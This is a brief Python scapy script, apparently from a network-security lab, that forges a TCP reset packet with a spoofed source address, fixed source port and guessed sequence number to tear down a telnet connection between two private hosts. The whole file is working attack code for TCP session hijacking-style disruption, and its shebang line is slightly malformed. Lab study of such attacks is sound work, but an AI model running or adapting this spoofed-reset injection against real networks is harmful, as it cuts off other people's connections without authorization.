#!usr/bin/python3
from scapy.all import *
import sys

source_port = 50204
sequence = 2106704268

print("Sending RESET Packet ...")
IPLayer = IP(src="10.9.0.5", dst="10.9.0.6")
TCPLayer = TCP(sport=source_port,dport=23,flags="R", seq=sequence)
pkt = IPLayer/TCPLayer
pkt.show()
send(pkt,verbose=0)
